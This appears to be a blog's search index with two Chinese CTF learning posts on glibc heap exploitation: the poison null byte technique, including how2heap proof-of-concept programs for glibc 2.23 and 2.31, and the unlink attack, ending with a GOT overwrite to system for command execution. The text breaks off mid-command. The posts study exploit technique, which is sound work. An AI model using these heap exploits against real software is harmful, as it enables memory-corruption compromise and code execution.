<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>poison null byte</title>
    <link href="/2022/06/30/poison-null-byte/"/>
    <url>/2022/06/30/poison-null-byte/</url>
    
    <content type="html"><![CDATA[<h1 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison null byte"></a>poison null byte</h1><p>本篇主要介绍一下跟着<a href="https://github.com/shellphish/how2heap">how2heap</a>和<a href="https://tttang.com/archive/1614/">cru5h</a>学习poison null byte的过程和一点思考，如有错误欢迎指正。</p><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><p>这里以<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.23/poison_null_byte.c">how2heap</a>的例子来学习。</p><figure class="highlight cpp"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></div></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);<br><br><span class="hljs-type">uint8_t</span>* a;<br><span class="hljs-type">uint8_t</span>* b;<br><span class="hljs-type">uint8_t</span>* c;<br><span class="hljs-type">uint8_t</span>* b1;<br><span class="hljs-type">uint8_t</span>* b2;<br><span class="hljs-type">uint8_t</span>* d;<br><span class="hljs-type">void</span> *barrier;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);<br>a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br><span class="hljs-type">int</span> real_a_size = <span class="hljs-built_in">malloc_usable_size</span>(a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span><br><span class="hljs-string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);<br><br><span class="hljs-comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span><br><span class="hljs-comment"> * the least significant byte of this will be 0x10, because the size of the chunk includes</span><br><span class="hljs-comment"> * the amount requested plus some amount required for the metadata. */</span><br>b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br>c = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c: %p\n&quot;</span>, c);<br><br>barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span><br><span class="hljs-string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);<br><br><span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br><br><span class="hljs-comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span><br><span class="hljs-comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span><br><span class="hljs-comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span><br><span class="hljs-comment">//*(size_t*)(b+0x1f0) = 0x200;</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span><br><span class="hljs-string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);<br><span class="hljs-comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span><br><span class="hljs-comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span><br>*(<span class="hljs-type">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><br><span class="hljs-comment">// this technique works by overwriting the size metadata of a free chunk</span><br><span class="hljs-built_in">free</span>(b);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);<br>a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br><span class="hljs-type">uint64_t</span>* c_prev_size_ptr = ((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-2</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);<br><br><span class="hljs-comment">// This malloc will result in a call to unlink on the chunk where b was.</span><br><span class="hljs-comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span><br><span class="hljs-comment">// will detect the heap corruption now.</span><br><span class="hljs-comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span><br><span class="hljs-comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span><br><span class="hljs-comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span><br><span class="hljs-comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,<br>*((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>)), *(<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x10</span> + *((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>))));<br>b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b1: %p\n&quot;</span>,b1);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span><br><span class="hljs-string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span><br><span class="hljs-string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-4</span>));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);<br><span class="hljs-comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span><br><br>b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b2: %p\n&quot;</span>,b2);<br><br><span class="hljs-built_in">memset</span>(b2,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-number">0x80</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(b1);<br><span class="hljs-built_in">free</span>(c);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);<br>d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;d: %p\n&quot;</span>,d);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);<br><span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New b2 content:\n%s\n&quot;</span>,b2);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span><br><span class="hljs-string">&quot;for the clear explanation of this technique.\n&quot;</span>);<br><br><span class="hljs-built_in">assert</span>(<span class="hljs-built_in">strstr</span>(b2, <span class="hljs-string">&quot;DDDDDDDDDDDD&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>首先申请四个chunk a,b,c和barrier，如图所示<br><img src="https://i.imgur.com/GFe7I8S.png"></p><p><code>*(size_t*)(b+0x1f0) = 0x200</code>是为了伪造presize的大小为0x200</p><p><img src="https://i.imgur.com/E07xkDD.png"></p><p><code>free(b)</code>之后四个chunk的状态如图所示，我们可以看到chunk c的真实的prevsize为0x210<br><img src="https://i.imgur.com/b0pSajZ.png"></p><p>然后<code>a[real_a_size] = 0</code>缩小chunk b的大小</p><p><img src="https://i.imgur.com/MnER5HG.png"></p><p>因为之前<code>*(size_t*)(b+0x1f0) = 0x200</code>已经伪造好了<code>chunksize(P) == prev_size (next_chunk(P)</code>因此可以通过检查</p><p>因为之前b已经free掉了，它现在被放到了unsortedbin中，申请一个比它小的0x100大小的堆块，会从已经放入到unsortedbin的b中分割一个b1，剩下的部分还在unsortedbin中，现在堆块状态如图所示。fake chunk是一个大小为0的chunk，分割b的话会缩小它的prevsize<br><img src="https://i.imgur.com/vD4On0B.png"></p><p>此时<code>b2 = malloc(0x80)</code>,分配填充内容后堆状态如图所示<br><img src="https://i.imgur.com/BFTytuO.png"></p><p>此时<code>free(b1)</code>和<code>free(c)</code>后，因为c的prev_size还是210，因此会忽略掉b2，直接b1和c合并，重新<code>malloc(d)</code>后会对b2造成overlap，输出b2的内容会发现变成了D。</p><h2 id="poison-null-byte原理"><a href="#poison-null-byte原理" class="headerlink" title="poison null byte原理"></a>poison null byte原理</h2><p><img src="https://i.imgur.com/adBbFgf.png"><br>这张图来源于<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.7_heap_exploit_2.html">ctf-all-in-one</a>,里面讲的会详细点，可以看一看。</p><h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><p>这里的利用主要是跟着<a href="https://tttang.com/archive/1614/">这篇文章</a>来学习的，具体的思想可以看原文，这里只是跟着更细致地调试一下。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">long</span> *tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);<br>    <span class="hljs-type">void</span> *pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10000</span> - ((<span class="hljs-type">long</span>)tmp&amp;<span class="hljs-number">0xffff</span>) - tmp[<span class="hljs-number">-1</span>]);<br>    <span class="hljs-type">void</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-type">char</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-type">void</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-type">void</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x510</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">free</span>(b);<br>    <span class="hljs-built_in">free</span>(prev);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>); <span class="hljs-comment">// b --&gt; prev --&gt; a in largebin</span><br>    <span class="hljs-type">long</span> *prev2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">//cash prev out</span><br>    prev2[<span class="hljs-number">1</span>] = <span class="hljs-number">0x501</span>;  <span class="hljs-comment">//fake size,here must long type</span><br>    prev2[<span class="hljs-number">0x500</span>/<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">long</span>)] = <span class="hljs-number">0x500</span>;<br>    <span class="hljs-type">short</span> *b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x510</span>); <span class="hljs-comment">// cash b out</span><br>    b2[<span class="hljs-number">0</span>] = <span class="hljs-number">16</span>; <span class="hljs-comment">//change fd</span><br>    <span class="hljs-type">void</span> *a2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);  <span class="hljs-comment">// cash a out</span><br>    <span class="hljs-built_in">free</span>(a2);     <span class="hljs-comment">// into unsorted bin</span><br>    <span class="hljs-built_in">free</span>(victim); <span class="hljs-comment">// into unsorted bin</span><br>    <span class="hljs-type">short</span> *a3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>); <span class="hljs-comment">//make a3&#x27;s bk not pointing to bin(now to victim)</span><br>    a3[<span class="hljs-number">4</span>] = <span class="hljs-number">16</span>; <span class="hljs-comment">// so just need to change the last 2 bytes of a3&#x27;s bk</span><br>    <span class="hljs-type">char</span> *victim2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>); <span class="hljs-comment">//cash out from unsorted bin</span><br>    victim2[<span class="hljs-number">-8</span>] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// use VULNERABILITY  clear prev_inuse bit</span><br>    <span class="hljs-comment">// backward consolidate, use prev2&#x27;s fd_nextsize and bk_nextsize to fake fd and bk</span><br>    <span class="hljs-built_in">free</span>(victim2);<br>    <span class="hljs-type">long</span> *merged = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">assert</span>((<span class="hljs-type">long</span>)merged - (<span class="hljs-type">long</span>)prev2 == <span class="hljs-number">0x10</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译的时候记得换成对应的libc版本</p><p>原文中也提到了，2.29之后增加了很多检查，除了要绕过<code>chunksize(p) == prevsize</code>之外，还要满足unlink的条件，unlink可以查看我之前的文章。</p><p>首先解释一下从unsortedbin双向链表里面取出来一个chunk时，fd指针会被破坏是什么意思。在malloc的时候，会检查unsortedbin中有没有相应大小的chunk，有的话将其取出来，然后将这个块之前的chunk都放入largebin中，因此取出来的时候这个堆块的fd指针是指向表头的。</p><p>为了解决这个难点，通过把unsortedbin整理到largebin的方式来保存fd指针，这一步可以通过malloc一个比unsortedbin中所有块都大的块来实现，这时候unsortedbin都被放到了largebin中，可以将fd_nextsize指针来作为fd指针。</p><p>接下来我们用gdb调试一下就会很清楚</p><p>首先运行到<code>free(a)</code>之前停下来，这时候已经完成了堆块的初始化布局。我理解的tmp和pad的作用就是为了让prev的地址从0x????00??开始。<br><img src="https://i.imgur.com/M4dpJkI.png"><br>然后把a,b,prev都free之后会进入unsortedbin中，再malloc(0x1000)后会进入到largebin中。<br><img src="https://i.imgur.com/ONp1Die.png"></p><p><code>free(a2)</code>之前，堆块的状态如图所示，因为在malloc b2之前，prev已经largebin中取出，因此此时b的fd指向的是a，b2[0] &#x3D; 16的目的就是将0a30变成0010，此时b2的fd指向的就是prev中伪造的fake chunk。</p><p><img src="https://i.imgur.com/FSy6nIL.png"></p><p>之后又free(a2)和free(victim)，此时在unsortedbin中的顺序为victim-&gt;a2-&gt;p，此时a2的bk指向的是victim，此时只需要a3[4]&#x3D;16像刚才修改fd那样将低2字节从0510变为0010即可<br><img src="https://i.imgur.com/MfqXcsJ.png"></p><p>这时候prev的unlink的检测已经准备好了，然后重新malloc victim后修改它的prev_inuse位为0，假装前面的fake chunk处于空闲状态，因此free（victim）后就会和prev2合并。</p><p>这张图很清楚的表明了程序的整个过程，堆块a和b就是为了让prev满足unlink的检测，不断地free和malloc地过程是为了将其放到bin里去自动构造fd和bk。<br><img src="https://i.imgur.com/08lqalM.png"></p><p>因此利用步骤为：</p><ol><li>申请chunk，低第2字节对齐</li><li>设置fake chunk，p-&gt;fd&#x3D;a，p-&gt;bk&#x3D;b, p.size&#x3D;0x501</li><li>设置b-&gt;fd&#x3D;p</li><li>设置a-&gt;bk&#x3D;p</li><li>伪造prev_size和prev_inuse</li><li>free触发合并</li></ol><p>文章中也提到了可以通过后向或者前向合并来保留unsortedbin中的fd指针，可以通过在合并后地chunk里地原size部位写，这样\00字节就写入到了fd中，因此需要确保p的低2位为00。<br><img src="https://i.imgur.com/J2n2NaO.png"><br>比如通过合并H0和D保留了D中的fd指针，然后申请一个H1，在0x431的部分再重新写入0x431这样多余的00就会将本来指向c1的fd改为了指向c0。<code>add(6,0x500-8, &#39;6&#39;*0x488 + p64(0x431))</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unlink</title>
    <link href="/2022/06/21/unlink/"/>
    <url>/2022/06/21/unlink/</url>
    
    <content type="html"><![CDATA[<h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><h2 id="释放堆"><a href="#释放堆" class="headerlink" title="释放堆"></a>释放堆</h2><p>释放堆时会检查相邻地址的chunk是否处于空闲状态，若是就会合并这两个chunk。合并时会进行unlink操作，将相邻地址的chunk进行unlink解链操作从bins中拿出来。</p><p><strong>堆合并分为向前合并和向后合并。</strong></p><ul><li>向后合并指的是在释放P时和他的pre_chunk合并（也就是相邻小地址的chunk）</li><li>向前合并指的是在释放P时和他的next_chunk合并（也就是相邻大地址的chunk）</li></ul><h2 id="Unlink的流程"><a href="#Unlink的流程" class="headerlink" title="Unlink的流程"></a>Unlink的流程</h2><figure class="highlight xl"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><pre><code class="hljs xl">#define unlink(AV, P, BK, FD) &#123;<br>            <span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))<br>              malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br>            FD = P-&gt;fd;<br>            BK = P-&gt;bk;<br>            <span class="hljs-function"><span class="hljs-title">if</span> (__builtin_expect (FD-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span> != P || BK-&gt;</span>fd != P, <span class="hljs-number">0</span>))<br>              malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);<br>            <span class="hljs-keyword">else</span> &#123;<br>                FD-&gt;bk = BK;<br>                BK-&gt;fd = FD;<br>                <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))<br>                    &amp;&amp; __<span class="hljs-function"><span class="hljs-title">builtin_expect</span> (P-&gt;</span>fd_nextsize != NULL, <span class="hljs-number">0</span>)) &#123;<br>                    <span class="hljs-function"><span class="hljs-title">if</span> (__builtin_expect (P-&gt;</span><span class="hljs-function"><span class="hljs-title">fd_nextsize</span>-&gt;</span>bk_nextsize != P, <span class="hljs-number">0</span>)<br>                        || __<span class="hljs-function"><span class="hljs-title">builtin_expect</span> (P-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span>fd_nextsize != P, <span class="hljs-number">0</span>))<br>                      malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);<br>                    <span class="hljs-function"><span class="hljs-title">if</span> (FD-&gt;</span>fd_nextsize == NULL) &#123;<br>                        <span class="hljs-function"><span class="hljs-title">if</span> (P-&gt;</span>fd_nextsize == P)<br>                          FD-&gt;<span class="hljs-function"><span class="hljs-title">fd_nextsize</span> = FD-&gt;</span>bk_nextsize = FD;<br>                        <span class="hljs-keyword">else</span> &#123;<br>                            FD-&gt;<span class="hljs-function"><span class="hljs-title">fd_nextsize</span> = P-&gt;</span>fd_nextsize;<br>                            FD-&gt;<span class="hljs-function"><span class="hljs-title">bk_nextsize</span> = P-&gt;</span>bk_nextsize;<br>                            P-&gt;<span class="hljs-function"><span class="hljs-title">fd_nextsize</span>-&gt;</span>bk_nextsize = FD;<br>                            P-&gt;<span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span>fd_nextsize = FD;<br>                          &#125;<br>                      &#125; <span class="hljs-keyword">else</span> &#123;<br>                        P-&gt;<span class="hljs-function"><span class="hljs-title">fd_nextsize</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span> = P-&gt;</span>bk_nextsize;<br>                        P-&gt;<span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fd_nextsize</span> = P-&gt;</span>fd_nextsize;<br>                      &#125;                         &#125;<br>              &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>(代码来源于<a href="https://lantern.cool/note-pwn-unlink/">这里</a>)<br>首先会检查当前chunk的大小是否和相邻next_chunk的pre_size的大小进行比较。然后会检查<code>FD-&gt;bk == P || BK-&gt;fd == P</code>。</p><p>因此想要执行unlink攻击，需要设置fake free chunk的size字段和相邻next_chunk的pre_size大小相同。并且需要设置<code>P-&gt;fd = ptr - 0x18</code> <code>P-&gt;bk = ptr - 0x10</code>来绕过第二个检查。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">FD</span> <span class="hljs-operator">=</span> P-&gt;fd <span class="hljs-operator">=</span> ptr - <span class="hljs-number">0</span>x18<br><span class="hljs-attribute">BK</span> <span class="hljs-operator">=</span> P-&gt;bk <span class="hljs-operator">=</span> ptr - <span class="hljs-number">0</span>x10<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/2o2ecAL.png"></p><p>因此</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">BK</span>-&gt;fd = ptr - <span class="hljs-number">0</span>x10 + <span class="hljs-number">0</span>x10 = ptr<br><span class="hljs-attribute">FD</span>-&gt;bk = ptr - <span class="hljs-number">0</span>x18 + <span class="hljs-number">0</span>x18 = ptr<br></code></pre></td></tr></table></figure><p>可绕过检查。<br>解链后，<code>FD-&gt;bk = BK</code>即<code>*ptr = ptr - 0x10</code>, <code>BK-&gt;fd=FD</code>即<code>*ptr = ptr - 0x18</code>。</p><p>unlink 后，对 ptr 指向的内存进行写入，如 <code>‘A’*0x18 + free@got</code>, 使得 ptr 指向 <code>free@got</code>, 再次对 ptr 指向的内存进行写入，可以把 <code>free@got</code> 修改为 <code>system</code> 的地址，之后调用 <code>free</code> 可任意命令执行。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>这里用到的例子是<a href="https://github.com/shellphish/how2heap">how2heap</a>中的<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/unsafe_unlink.c">unsafe_unlink</a></p><p>首先<code>gcc unsafe_unlink.c -o unsafe_unlink 